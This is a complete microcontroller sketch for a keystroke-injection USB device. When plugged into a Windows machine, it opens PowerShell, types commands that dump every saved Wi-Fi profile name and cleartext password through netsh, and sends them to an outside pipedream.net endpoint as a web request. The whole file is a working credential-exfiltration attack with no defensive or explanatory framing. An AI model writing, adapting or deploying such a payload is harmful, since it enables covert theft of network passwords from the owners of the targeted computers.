#include <USBHID.h>

void typekey(int key){
  BootKeyboard.press(key);
  delay(50);
  BootKeyboard.release(key);
  }
  
void setup() 
{
    USBHID_begin_with_serial(HID_BOOT_KEYBOARD);
    BootKeyboard.begin(); // needed just in case you need LED support
    delay(1500);
    BootKeyboard.press(KEY_LEFT_GUI);
    BootKeyboard.press('r');
    BootKeyboard.releaseAll();
    delay(100);
    BootKeyboard.print("powershell");
    delay(100);
    typekey(KEY_RETURN);
    delay(5000);
    BootKeyboard.print("$maybe = (netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}  | Select-String \"Key Content\\W+\\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{@{ PROFILE_NAME=$name;PASSWORD=$pass}}");
    delay(100);
    typekey(KEY_RETURN);
    delay(100);
    BootKeyboard.print("$a = ($maybe.values | Out-String -Stream)");
    delay(100);
    typekey(KEY_RETURN);
    delay(100);
    BootKeyboard.print("$c = $a -join \",\"");
    delay(100);
    typekey(KEY_RETURN);
    delay(100);
    BootKeyboard.print("$data = Invoke-RestMethod -Method Get -d -Uri \"https://envbfffce4gw.x.pipedream.net?$c\"");
    delay(100);
    typekey(KEY_RETURN);
    delay(100);
    BootKeyboard.print("exit");
    delay(100);
    typekey(KEY_RETURN);
    delay(100);
    BootKeyboard.end();
}

void loop() 
{
 
}
